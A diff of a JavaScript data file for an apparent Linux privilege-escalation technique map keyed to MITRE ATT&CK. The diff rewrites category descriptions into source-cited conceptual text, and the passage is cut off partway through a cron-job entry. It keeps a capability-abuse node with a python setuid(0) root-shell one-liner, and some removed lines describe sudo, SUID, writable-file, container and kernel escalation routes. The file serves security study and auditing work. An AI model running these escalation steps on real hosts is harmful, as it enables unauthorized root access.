@@ -25,48 +25,545 @@ import { cat, mitre, r } from '../lib.js';
 /** @type {import('../schema.js').TechniqueNodeDef[]} */
 export const linuxPrivescNodes = [
   // ── Lane categories ────────────────────────────────────────────────────────
-  cat('lin-cat-sudo', 'Sudo Abuse', 'sudo', 'Turn a sudo right or a sudo bug into a root shell.', 'The most common Linux privesc. sudo -l reveals commands you may run as root and the environment variables sudo preserves (env_keep in the matching Defaults); sudo -V shows the version, which you compare against known-vulnerable ranges. A permissive rule, a shell-spawning binary, LD_PRELOAD, argument injection, or a sudo CVE each gets you a root shell.', {
-    mitre: 'T1548.003',
-    references: [
-      { label: 'GTFOBins, Sudo', url: 'https://gtfobins.github.io/#+sudo' },
+  {
+    "id": "lin-cat-sudo",
+    "label": "Sudo Abuse",
+    "phase": "sudo",
+    "kind": "category",
+    "summary": "Understand policy-controlled execution as another user.",
+    "description": "sudo allows a permitted user to run a command as another account, which can be root or a different user, according to a security policy. The policy decides what authority is granted and may require authentication. sudo supports policy plugins; sudoers is its default policy. A sudo permission therefore needs to be understood in terms of its policy and target account.",
+    "mitre": {
+      "id": "T1548.003",
+      "url": "https://attack.mitre.org/techniques/T1548/003/"
+    },
+    "references": [
+      {
+        "label": "Sudo Project, sudo(8)",
+        "url": "https://www.sudo.ws/docs/man/sudo.man/",
+        "section": "DESCRIPTION",
+        "kind": "primary"
+      }
     ],
-  }),
-  cat('lin-cat-suid', 'SUID / SGID & Capabilities', 'suid', 'Abuse a binary that runs with elevated privilege regardless of the caller.', 'setuid/setgid binaries and file capabilities let a program keep root (or another owner) power no matter who launches it. Abuse a known shell escape, hijack a library or a relatively-named command it loads, use a dangerous capability, or reverse a custom binary for a flaw.', {
-    mitre: 'T1548.001',
-    references: [
-      { label: 'GTFOBins, SUID', url: 'https://gtfobins.github.io/#+suid' },
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
+      "reviewedContent": {
+        "description": "sudo allows a permitted user to run a command as another account, which can be root or a different user, according to a security policy. The policy decides what authority is granted and may require authentication. sudo supports policy plugins; sudoers is its default policy. A sudo permission therefore needs to be understood in terms of its policy and target account.",
+        "id": "lin-cat-sudo",
+        "kind": "category",
+        "label": "Sudo Abuse",
+        "mitre": {
+          "id": "T1548.003",
+          "url": "https://attack.mitre.org/techniques/T1548/003/"
+        },
+        "phase": "sudo",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Sudo Project, sudo(8)",
+            "section": "DESCRIPTION",
+            "url": "https://www.sudo.ws/docs/man/sudo.man/"
+          }
+        ],
+        "summary": "Understand policy-controlled execution as another user."
+      },
+      "claims": [
+        {
+          "text": "sudo permits command execution as root or another user according to the configured security policy.",
+          "section": "Sudo Project, sudo(8) — DESCRIPTION",
+          "sources": [
+            "https://www.sudo.ws/docs/man/sudo.man/"
+          ]
+        },
+        {
+          "text": "sudo supports security-policy plugins, uses sudoers by default, and lets the policy determine authority and authentication requirements.",
+          "section": "Sudo Project, sudo(8) — DESCRIPTION",
+          "sources": [
+            "https://www.sudo.ws/docs/man/sudo.man/"
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "id": "lin-cat-suid",
+    "label": "SUID / SGID & Capabilities",
+    "phase": "suid",
+    "kind": "category",
+    "summary": "Executable identity bits and individual Linux privileges.",
+    "description": "For executable files, set-user-ID and set-group-ID bits can change a program's effective user or group identity when it starts. Linux capabilities divide privileges into individual units; file capabilities can contribute to a program's capability sets. These mechanisms do not imply unrestricted root authority. Linux also restricts their effects through execution and filesystem security settings.",
+    "mitre": {
+      "id": "T1548.001",
+      "url": "https://attack.mitre.org/techniques/T1548/001/"
+    },
+    "references": [
+      {
+        "label": "Linux man-pages, execve(2)",
+        "url": "https://man7.org/linux/man-pages/man2/execve.2.html",
+        "kind": "primary",
+        "section": "DESCRIPTION: set-user-ID and set-group-ID behavior and restrictions"
+      },
+      {
+        "label": "Linux man-pages, capabilities(7)",
+        "url": "https://man7.org/linux/man-pages/man7/capabilities.7.html",
+        "kind": "primary",
+        "section": "DESCRIPTION: independently enabled capabilities; File capabilities"
+      }
     ],
-  }),
-  cat('lin-cat-jobs', 'Scheduled Jobs & Services', 'jobs', 'Hijack something root runs on a schedule or on demand.', 'Cron, systemd timers, logrotate, and root-run scripts execute as root on a schedule or event. If you can write the job, its target script, a directory it uses, or influence a wildcard it expands, your code runs as root the next time it fires.', {
-    mitre: 'T1053.003',
-    references: [
-      { label: 'InternalAllTheThings, Linux Privilege Escalation', url: 'https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/' },
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
+      "reviewedContent": {
+        "id": "lin-cat-suid",
+        "label": "SUID / SGID & Capabilities",
+        "phase": "suid",
+        "kind": "category",
+        "summary": "Executable identity bits and individual Linux privileges.",
+        "description": "For executable files, set-user-ID and set-group-ID bits can change a program's effective user or group identity when it starts. Linux capabilities divide privileges into individual units; file capabilities can contribute to a program's capability sets. These mechanisms do not imply unrestricted root authority. Linux also restricts their effects through execution and filesystem security settings.",
+        "mitre": {
+          "id": "T1548.001",
+          "url": "https://attack.mitre.org/techniques/T1548/001/"
+        },
+        "references": [
+          {
+            "label": "Linux man-pages, execve(2)",
+            "url": "https://man7.org/linux/man-pages/man2/execve.2.html",
+            "kind": "primary",
+            "section": "DESCRIPTION: set-user-ID and set-group-ID behavior and restrictions"
+          },
+          {
+            "label": "Linux man-pages, capabilities(7)",
+            "url": "https://man7.org/linux/man-pages/man7/capabilities.7.html",
+            "kind": "primary",
+            "section": "DESCRIPTION: independently enabled capabilities; File capabilities"
+          }
+        ]
+      },
+      "claims": [
+        {
+          "text": "Executable SUID and SGID affect effective identities, subject to the restrictions documented by execve(2).",
+          "section": "Linux man-pages, execve(2) — DESCRIPTION: set-user-ID and set-group-ID behavior and restrictions",
+          "sources": [
+            "https://man7.org/linux/man-pages/man2/execve.2.html"
+          ]
+        },
+        {
+          "text": "Capabilities divide privileges into separate units, and file capabilities participate in assigning program privileges.",
+          "section": "Linux man-pages, capabilities(7) — DESCRIPTION: independently enabled capabilities; File capabilities",
+          "sources": [
+            "https://man7.org/linux/man-pages/man7/capabilities.7.html"
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "id": "lin-cat-jobs",
+    "label": "Scheduled Jobs & Services",
+    "phase": "jobs",
+    "kind": "category",
+    "summary": "Scheduled work and the account under which it runs.",
+    "description": "Scheduled work can run under different accounts. A user crontab runs as its owner; system crontabs specify an account for each job. A systemd timer activates another unit, usually a service. The service's execution identity depends on its service manager and configuration. Scheduling alone does not imply root privileges.",
+    "mitre": {
+      "id": "T1053.003",
+      "url": "https://attack.mitre.org/techniques/T1053/003/"
+    },
+    "references": [
+      {
+        "label": "Cronie, crontab(5)",
+        "url": "https://man7.org/linux/man-pages/man5/crontab.5.html",
+        "kind": "primary",
+        "section": "DESCRIPTION; Jobs in /etc/cron.d/"
+      },
+      {
+        "label": "systemd, systemd.timer(5)",
+        "url": "https://man7.org/linux/man-pages/man5/systemd.timer.5.html",
+        "kind": "primary",
+        "section": "DESCRIPTION: the unit activated by a timer"
+      },
+      {
+        "label": "systemd, systemd.exec(5)",
+        "url": "https://man7.org/linux/man-pages/man5/systemd.exec.5.html",
+        "kind": "primary",
+        "section": "USER/GROUP IDENTITY: User=, Group="
+      }
     ],
-  }),
-  cat('lin-cat-creds', 'Credentials & Secrets', 'creds', 'Find or capture a credential that unlocks root or another user.', 'Operators leave secrets everywhere: config files, histories, git repos, databases, SSH keys, and live process memory. Recover one, reuse a password, crack a hash, or hijack a privileged terminal session or process to become root or a higher-privileged user.', {
-    mitre: 'T1552.001',
-    references: [
-      { label: 'InternalAllTheThings, Linux Privilege Escalation', url: 'https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/' },
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
+      "reviewedContent": {
+        "id": "lin-cat-jobs",
+        "label": "Scheduled Jobs & Services",
+        "phase": "jobs",
+        "kind": "category",
+        "summary": "Scheduled work and the account under which it runs.",
+        "description": "Scheduled work can run under different accounts. A user crontab runs as its owner; system crontabs specify an account for each job. A systemd timer activates another unit, usually a service. The service's execution identity depends on its service manager and configuration. Scheduling alone does not imply root privileges.",
+        "mitre": {
+          "id": "T1053.003",
+          "url": "https://attack.mitre.org/techniques/T1053/003/"
+        },
+        "references": [
+          {
+            "label": "Cronie, crontab(5)",
+            "url": "https://man7.org/linux/man-pages/man5/crontab.5.html",
+            "kind": "primary",
+            "section": "DESCRIPTION; Jobs in /etc/cron.d/"
+          },
+          {
+            "label": "systemd, systemd.timer(5)",
+            "url": "https://man7.org/linux/man-pages/man5/systemd.timer.5.html",
+            "kind": "primary",
+            "section": "DESCRIPTION: the unit activated by a timer"
+          },
+          {
+            "label": "systemd, systemd.exec(5)",
+            "url": "https://man7.org/linux/man-pages/man5/systemd.exec.5.html",
+            "kind": "primary",
+            "section": "USER/GROUP IDENTITY: User=, Group="
+          }
+        ]
+      },
+      "claims": [
+        {
+          "text": "Cronie distinguishes owner-run user crontabs from system crontabs with an explicit account field.",
+          "section": "Cronie, crontab(5) — DESCRIPTION; Jobs in /etc/cron.d/",
+          "sources": [
+            "https://man7.org/linux/man-pages/man5/crontab.5.html"
+          ]
+        },
+        {
+          "text": "A systemd timer activates a unit, normally the corresponding service.",
+          "section": "systemd, systemd.timer(5) — DESCRIPTION: the unit activated by a timer",
+          "sources": [
+            "https://man7.org/linux/man-pages/man5/systemd.timer.5.html"
+          ]
+        },
+        {
+          "text": "systemd service identity depends on the manager and account configuration; services need not all run as root.",
+          "section": "systemd, systemd.exec(5) — USER/GROUP IDENTITY: User=, Group=",
+          "sources": [
+            "https://man7.org/linux/man-pages/man5/systemd.exec.5.html"
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "id": "lin-cat-creds",
+    "label": "Credentials & Secrets",
+    "phase": "creds",
+    "kind": "category",
+    "summary": "Distinguish password verifiers from public and private keys.",
+    "description": "Passwords and public-key authentication use different kinds of information. NIST specifies salted password hashing for stored password verifiers. OpenSSH public-key authentication uses a public/private key pair: the server knows the public key, and the client proves access to the private key. A password hash, a public key, and a private key therefore have different roles and should not be treated as interchangeable secrets.",
+    "mitre": {
+      "id": "T1552.001",
+      "url": "https://attack.mitre.org/techniques/T1552/001/"
+    },
+    "references": [
+      {
+        "label": "NIST, SP 800-63B-4",
+        "url": "https://pages.nist.gov/800-63-4/sp800-63b.html",
+        "section": "Password Verifiers",
+        "kind": "primary"
+      },
+      {
+        "label": "OpenSSH, ssh(1)",
+        "url": "https://man.openbsd.org/ssh",
+        "section": "AUTHENTICATION",
+        "kind": "primary"
+      }
     ],
-  }),
-  cat('lin-cat-files', 'Writable Files & Shares', 'files', 'Abuse a write to a sensitive system file or an unsquashed share.', 'When the wrong file or share is writable, root follows directly: add an account to /etc/passwd, crack or replace a hash in /etc/shadow, turn an arbitrary-write primitive into authorized_keys or a cron job, or plant a setuid binary on an NFS export mounted no_root_squash.', {
-    mitre: 'T1222.002',
-    references: [
-      { label: 'MITRE, CWE-732: Incorrect Permission Assignment', url: 'https://cwe.mitre.org/data/definitions/732.html' },
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
+      "reviewedContent": {
+        "description": "Passwords and public-key authentication use different kinds of information. NIST specifies salted password hashing for stored password verifiers. OpenSSH public-key authentication uses a public/private key pair: the server knows the public key, and the client proves access to the private key. A password hash, a public key, and a private key therefore have different roles and should not be treated as interchangeable secrets.",
+        "id": "lin-cat-creds",
+        "kind": "category",
+        "label": "Credentials & Secrets",
+        "mitre": {
+          "id": "T1552.001",
+          "url": "https://attack.mitre.org/techniques/T1552/001/"
+        },
+        "phase": "creds",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "NIST, SP 800-63B-4",
+            "section": "Password Verifiers",
+            "url": "https://pages.nist.gov/800-63-4/sp800-63b.html"
+          },
+          {
+            "kind": "primary",
+            "label": "OpenSSH, ssh(1)",
+            "section": "AUTHENTICATION",
+            "url": "https://man.openbsd.org/ssh"
+          }
+        ],
+        "summary": "Distinguish password verifiers from public and private keys."
+      },
+      "claims": [
+        {
+          "text": "NIST SP 800-63B-4 requires stored password verifiers to use salted hashing with a suitable password hashing scheme.",
+          "section": "NIST, SP 800-63B-4 — Password Verifiers",
+          "sources": [
+            "https://pages.nist.gov/800-63-4/sp800-63b.html"
+          ]
+        },
+        {
+          "text": "OpenSSH public-key authentication distinguishes the server-known public key from the private key whose possession the client proves.",
+          "section": "OpenSSH, ssh(1) — AUTHENTICATION: public-key authentication",
+          "sources": [
+            "https://man.openbsd.org/ssh"
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "id": "lin-cat-files",
+    "label": "Writable Files & Shares",
+    "phase": "files",
+    "kind": "category",
+    "summary": "Understand file ownership, permission bits, and access lists.",
+    "description": "Linux file metadata records an owner and group, with read, write, and execute permission bits for the owner, group, and others. POSIX access control lists provide more detailed discretionary permissions for individual users and groups. These controls describe access to files and directories; writable content should not be summarized as automatic root authority.",
+    "mitre": {
+      "id": "T1222.002",
+      "url": "https://attack.mitre.org/techniques/T1222/002/"
+    },
+    "references": [
+      {
+        "label": "Linux man-pages, inode(7)",
+        "url": "https://man7.org/linux/man-pages/man7/inode.7.html",
+        "section": "DESCRIPTION: User ID; Group ID; The file type and mode",
+        "kind": "primary"
+      },
+      {
+        "label": "Linux ACL project, acl(5)",
+        "url": "https://man7.org/linux/man-pages/man5/acl.5.html",
+        "section": "DESCRIPTION; ACCESS CHECK ALGORITHM",
+        "kind": "primary"
+      }
     ],
-  }),
-  cat('lin-cat-containers', 'Privileged Groups & Containers', 'containers', 'Escape a container or ride a root-equivalent group to the host.', 'Some group memberships (docker, lxd, disk) are root by another name, and a mis-scoped container is a shell away from the host. Drive the Docker daemon, spin an LXD image, or exploit an over-permissioned or vulnerable runtime to break out to the underlying host.', {
-    mitre: 'T1611',
-    references: [
-      { label: 'InternalAllTheThings, Linux Privilege Escalation', url: 'https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/' },
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
+      "reviewedContent": {
+        "description": "Linux file metadata records an owner and group, with read, write, and execute permission bits for the owner, group, and others. POSIX access control lists provide more detailed discretionary permissions for individual users and groups. These controls describe access to files and directories; writable content should not be summarized as automatic root authority.",
+        "id": "lin-cat-files",
+        "kind": "category",
+        "label": "Writable Files & Shares",
+        "mitre": {
+          "id": "T1222.002",
+          "url": "https://attack.mitre.org/techniques/T1222/002/"
+        },
+        "phase": "files",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Linux man-pages, inode(7)",
+            "section": "DESCRIPTION: User ID; Group ID; The file type and mode",
+            "url": "https://man7.org/linux/man-pages/man7/inode.7.html"
+          },
+          {
+            "kind": "primary",
+            "label": "Linux ACL project, acl(5)",
+            "section": "DESCRIPTION; ACCESS CHECK ALGORITHM",
+            "url": "https://man7.org/linux/man-pages/man5/acl.5.html"
+          }
+        ],
+        "summary": "Understand file ownership, permission bits, and access lists."
+      },
+      "claims": [
+        {
+          "text": "Linux file metadata records ownership and read, write, and execute permission bits for owner, group, and others.",
+          "section": "Linux man-pages, inode(7) — DESCRIPTION: User ID; Group ID; The file type and mode",
+          "sources": [
+            "https://man7.org/linux/man-pages/man7/inode.7.html"
+          ]
+        },
+        {
+          "text": "POSIX access control lists provide finer-grained discretionary access rights for files and directories, including individual users and groups.",
+          "section": "Linux ACL project, acl(5) — DESCRIPTION; ACL ENTRIES",
+          "sources": [
+            "https://man7.org/linux/man-pages/man5/acl.5.html"
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "id": "lin-cat-containers",
+    "label": "Privileged Groups & Containers",
+    "phase": "containers",
+    "kind": "category",
+    "summary": "Container administration, rootless operation, and identity boundaries.",
+    "description": "Docker documents root-level authority for access through the docker group to a root-running daemon. Rootless Docker instead runs the daemon and containers without host root privileges. Linux user namespaces can map an internal UID 0 to an unprivileged identity outside the namespace. A container's root identity therefore does not by itself establish host root authority.",
+    "mitre": {
+      "id": "T1611",
+      "url": "https://attack.mitre.org/techniques/T1611/"
+    },
+    "references": [
+      {
+        "label": "Docker, Linux post-installation steps",
+        "url": "https://docs.docker.com/engine/install/linux-postinstall/",
+        "kind": "primary",
+        "section": "Manage Docker as a non-root user: docker group warning"
+      },
+      {
+        "label": "Docker, Rootless mode",
+        "url": "https://docs.docker.com/engine/security/rootless/",
+        "kind": "primary",
+        "section": "Introduction; How it works"
+      },
+      {
+        "label": "Linux man-pages, user_namespaces(7)",
+        "url": "https://man7.org/linux/man-pages/man7/user_namespaces.7.html",
+        "kind": "primary",
+        "section": "DESCRIPTION: identities inside and outside a user namespace"
+      }
     ],
-  }),
-  cat('lin-cat-kernel', 'Kernel & Library Exploits', 'kernel', 'Exploit a bug in the kernel, a core library, or a versioned service.', 'When the configuration is clean, a code bug still works. Match the exact kernel, glibc, polkit, or service version to a public exploit: Dirty Pipe, GameOver(lay), nf_tables, Looney Tunables, PwnKit and their kin turn an unprivileged shell into root on an unpatched host.', {
-    mitre: 'T1068',
-    references: [
-      { label: 'InternalAllTheThings, Linux Privilege Escalation', url: 'https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/' },
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
+      "reviewedContent": {
+        "id": "lin-cat-containers",
+        "label": "Privileged Groups & Containers",
+        "phase": "containers",
+        "kind": "category",
+        "summary": "Container administration, rootless operation, and identity boundaries.",
+        "description": "Docker documents root-level authority for access through the docker group to a root-running daemon. Rootless Docker instead runs the daemon and containers without host root privileges. Linux user namespaces can map an internal UID 0 to an unprivileged identity outside the namespace. A container's root identity therefore does not by itself establish host root authority.",
+        "mitre": {
+          "id": "T1611",
+          "url": "https://attack.mitre.org/techniques/T1611/"
+        },
+        "references": [
+          {
+            "label": "Docker, Linux post-installation steps",
+            "url": "https://docs.docker.com/engine/install/linux-postinstall/",
+            "kind": "primary",
+            "section": "Manage Docker as a non-root user: docker group warning"
+          },
+          {
+            "label": "Docker, Rootless mode",
+            "url": "https://docs.docker.com/engine/security/rootless/",
+            "kind": "primary",
+            "section": "Introduction; How it works"
+          },
+          {
+            "label": "Linux man-pages, user_namespaces(7)",
+            "url": "https://man7.org/linux/man-pages/man7/user_namespaces.7.html",
+            "kind": "primary",
+            "section": "DESCRIPTION: identities inside and outside a user namespace"
+          }
+        ]
+      },
+      "claims": [
+        {
+          "text": "Docker warns that its docker group grants root-level privileges in the documented root-running daemon setup.",
+          "section": "Docker, Linux post-installation steps — Manage Docker as a non-root user: docker group warning",
+          "sources": [
+            "https://docs.docker.com/engine/install/linux-postinstall/"
+          ]
+        },
+        {
+          "text": "Rootless mode runs both the Docker daemon and containers without host root privileges.",
+          "section": "Docker, Rootless mode — Introduction; How it works",
+          "sources": [
+            "https://docs.docker.com/engine/security/rootless/"
+          ]
+        },
+        {
+          "text": "UID 0 inside a user namespace can correspond to an unprivileged identity outside it.",
+          "section": "Linux man-pages, user_namespaces(7) — DESCRIPTION: identities inside and outside a user namespace",
+          "sources": [
+            "https://man7.org/linux/man-pages/man7/user_namespaces.7.html"
+          ]
+        }
+      ]
+    }
+  },
+  {
+    "id": "lin-cat-kernel",
+    "label": "Kernel & Library Exploits",
+    "phase": "kernel",
+    "kind": "category",
+    "summary": "Understand security advisories and backported fixes.",
+    "description": "Vendors can apply a security fix from a newer upstream release to an older supported package, a practice called backporting. Red Hat documents that an upstream version number alone can therefore produce misleading vulnerability conclusions. Its security advisories explain the delivered fix and associate it with CVE identifiers. Vulnerability terminology should be read alongside those vendor records.",
+    "mitre": {
+      "id": "T1068",
+      "url": "https://attack.mitre.org/techniques/T1068/"
+    },
+    "references": [
+      {
+        "label": "Red Hat, Backporting Security Fixes",
+        "url": "https://access.redhat.com/security/updates/backporting",
+        "section": "Introduction; Explaining Common Release-Numbering Confusion",
+        "kind": "primary"
+      }
     ],
-  }),
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
+      "reviewedContent": {
+        "description": "Vendors can apply a security fix from a newer upstream release to an older supported package, a practice called backporting. Red Hat documents that an upstream version number alone can therefore produce misleading vulnerability conclusions. Its security advisories explain the delivered fix and associate it with CVE identifiers. Vulnerability terminology should be read alongside those vendor records.",
+        "id": "lin-cat-kernel",
+        "kind": "category",
+        "label": "Kernel & Library Exploits",
+        "mitre": {
+          "id": "T1068",
+          "url": "https://attack.mitre.org/techniques/T1068/"
+        },
+        "phase": "kernel",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Red Hat, Backporting Security Fixes",
+            "section": "Introduction; Explaining Common Release-Numbering Confusion",
+            "url": "https://access.redhat.com/security/updates/backporting"
+          }
+        ],
+        "summary": "Understand security advisories and backported fixes."
+      },
+      "claims": [
+        {
+          "text": "Backporting applies a security fix from newer upstream software to an older distributed package.",
+          "section": "Red Hat, Backporting Security Fixes — Introduction",
+          "sources": [
+            "https://access.redhat.com/security/updates/backporting"
+          ]
+        },
+        {
+          "text": "Red Hat documents that upstream-version-only checks can produce false positives and uses CVE-linked advisories to describe its security fixes.",
+          "section": "Red Hat, Backporting Security Fixes — Explaining Common Release-Numbering Confusion",
+          "sources": [
+            "https://access.redhat.com/security/updates/backporting"
+          ]
+        }
+      ]
+    }
+  },
 
   // ── Lane 1: Sudo Abuse ───────────────────────────────────────────────────────
   {
@@ -242,26 +739,133 @@ export PATH=/tmp:$PATH
     opsec: 'Modifying PATH is per-session and quiet, but the stand-in binary in /tmp and the anomalous child of a system binary are visible in process auditing.',
   },
   {
-    id: 'lin-caps',
-    label: 'Linux Capabilities',
-    phase: 'suid',
-    summary: 'A binary carries a capability (cap_setuid, cap_dac_override, ...) that yields root.',
-    description:
-      'File capabilities split root into discrete powers attached to a binary, and several are root-equivalent. cap_setuid+ep on an interpreter lets it call setuid(0) and drop a root shell. cap_dac_override reads or writes any file (edit /etc/shadow). cap_sys_admin, cap_sys_ptrace, and cap_sys_module are similarly decisive. Enumerate with getcap and match the capability to its abuse.',
-    requires: ['A binary with a dangerous capability set (cap_setuid, cap_dac_override, cap_sys_admin, cap_sys_ptrace, cap_sys_module)'],
-    commands: [
-      { label: 'Find capabilities', code: r`getcap -r / 2>/dev/null`, lang: 'bash' },
-      { label: 'Abuse cap_setuid on an interpreter', code: r`# e.g. python with cap_setuid+ep:
-./python -c 'import os;os.setuid(0);os.system("/bin/bash")'`, lang: 'bash' },
-      { label: 'Abuse cap_dac_override to read shadow', code: r`# a binary with cap_dac_override can open any file regardless of perms`, lang: 'bash' },
+    "id": "lin-caps",
+    "label": "Linux Capabilities",
+    "phase": "suid",
+    "summary": "Understand individual Linux privileges and thread capability sets.",
+    "description": "Linux capabilities divide traditional superuser privileges into individually controlled units. Capabilities are attributes of threads, and the kernel consults a thread's effective capability set when checking privileged operations. The capability model distinguishes individual permissions from the broad concept of running as root.",
+    "requires": [
+      "A binary with a dangerous capability set (cap_setuid, cap_dac_override, cap_sys_admin, cap_sys_ptrace, cap_sys_module)"
     ],
-    tools: [{ name: 'GTFOBins, Capabilities', url: 'https://gtfobins.org/#//^capabilities$' }],
-    mitre: mitre('T1548'),
-    references: [
-      { label: 'MITRE ATT&CK, Abuse Elevation Control Mechanism (T1548)', url: 'https://attack.mitre.org/techniques/T1548/' },
-      { label: 'GTFOBins, Capabilities', url: 'https://gtfobins.org/#//^capabilities$' },
+    "commands": [
+      {
+        "label": "Find capabilities",
+        "code": "getcap -r / 2>/dev/null",
+        "lang": "bash"
+      },
+      {
+        "label": "Abuse cap_setuid on an interpreter",
+        "code": "# e.g. python with cap_setuid+ep:\n./python -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'",
+        "lang": "bash"
+      },
+      {
+        "label": "Abuse cap_dac_override to read shadow",
+        "code": "# a binary with cap_dac_override can open any file regardless of perms",
+        "lang": "bash"
+      }
     ],
-    opsec: 'Using a capability is indistinguishable from legitimate use of the binary; the child shell it spawns as root is the signal. Capabilities set on non-standard binaries are themselves a red flag in a config audit.',
+    "tools": [
+      {
+        "name": "GTFOBins, Capabilities",
+        "url": "https://gtfobins.org/#//^capabilities$"
+      }
+    ],
+    "mitre": {
+      "id": "T1548",
+      "url": "https://attack.mitre.org/techniques/T1548/"
+    },
+    "references": [
+      {
+        "label": "Linux man-pages, capabilities(7)",
+        "url": "https://man7.org/linux/man-pages/man7/capabilities.7.html",
+        "kind": "primary"
+      },
+      {
+        "label": "MITRE ATT&CK, Abuse Elevation Control Mechanism (T1548)",
+        "url": "https://attack.mitre.org/techniques/T1548/"
+      },
+      {
+        "label": "GTFOBins, Capabilities",
+        "url": "https://gtfobins.org/#//^capabilities$"
+      }
+    ],
+    "opsec": "Using a capability is indistinguishable from legitimate use of the binary; the child shell it spawns as root is the signal. Capabilities set on non-standard binaries are themselves a red flag in a config audit.",
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual Linux configuration definitions: capabilities, account records, job execution identity, NFS export tables and container identities. Excludes commands, tools, prerequisites, exploit mechanics, applicability, current host configuration, connection outcomes, route viability and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "commands": [
+          {
+            "code": "getcap -r / 2>/dev/null",
+            "label": "Find capabilities",
+            "lang": "bash"
+          },
+          {
+            "code": "# e.g. python with cap_setuid+ep:\n./python -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'",
+            "label": "Abuse cap_setuid on an interpreter",
+            "lang": "bash"
+          },
+          {
+            "code": "# a binary with cap_dac_override can open any file regardless of perms",
+            "label": "Abuse cap_dac_override to read shadow",
+            "lang": "bash"
+          }
+        ],
+        "description": "Linux capabilities divide traditional superuser privileges into individually controlled units. Capabilities are attributes of threads, and the kernel consults a thread's effective capability set when checking privileged operations. The capability model distinguishes individual permissions from the broad concept of running as root.",
+        "id": "lin-caps",
+        "label": "Linux Capabilities",
+        "mitre": {
+          "id": "T1548",
+          "url": "https://attack.mitre.org/techniques/T1548/"
+        },
+        "opsec": "Using a capability is indistinguishable from legitimate use of the binary; the child shell it spawns as root is the signal. Capabilities set on non-standard binaries are themselves a red flag in a config audit.",
+        "phase": "suid",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Linux man-pages, capabilities(7)",
+            "url": "https://man7.org/linux/man-pages/man7/capabilities.7.html"
+          },
+          {
+            "label": "MITRE ATT&CK, Abuse Elevation Control Mechanism (T1548)",
+            "url": "https://attack.mitre.org/techniques/T1548/"
+          },
+          {
+            "label": "GTFOBins, Capabilities",
+            "url": "https://gtfobins.org/#//^capabilities$"
+          }
+        ],
+        "requires": [
+          "A binary with a dangerous capability set (cap_setuid, cap_dac_override, cap_sys_admin, cap_sys_ptrace, cap_sys_module)"
+        ],
+        "summary": "Understand individual Linux privileges and thread capability sets.",
+        "tools": [
+          {
+            "name": "GTFOBins, Capabilities",
+            "url": "https://gtfobins.org/#//^capabilities$"
+          }
+        ]
+      },
+      "claims": [
+        {
+          "text": "Linux capabilities separate traditional superuser privileges into independently enabled units and are a per-thread attribute.",
+          "section": "Linux man-pages, capabilities(7) — DESCRIPTION: opening capability definition",
+          "sources": [
+            "https://man7.org/linux/man-pages/man7/capabilities.7.html"
+          ]
+        },
+        {
+          "text": "The effective capability set is the set the kernel uses for a thread's permission checks.",
+          "section": "Linux man-pages, capabilities(7) — Thread capability sets — Effective",
+          "sources": [
+            "https://man7.org/linux/man-pages/man7/capabilities.7.html"
+          ]
+        }
+      ]
+    }
   },
   {
     id: 'lin-suid-custom',
@@ -292,28 +896,133 @@ python pyinstxtractor.py ./bin   # PyInstaller (or: pyinstxtractor-ng ./bin); th
 
   // ── Lane 3: Scheduled Jobs & Services ──────────────────────────────────────────
   {
-    id: 'lin-cron-writable',
-    label: 'Writable Cron Job',
-    phase: 'jobs',
-    summary: 'A root cron job, its script, or a directory it uses is writable by you.',
-    description:
-      'Cron and systemd timers run jobs as their owner, usually root. Enumerate /etc/crontab, /etc/cron.*, and per-user crontabs, and watch with pspy to catch jobs not listed in a file. If the invoked script is writable, append a reverse shell or a setuid copy of bash; if only the directory is writable, drop a file the job globs in; if the job calls a command by relative name, that is a PATH hijack. Your payload runs as root on the next tick.',
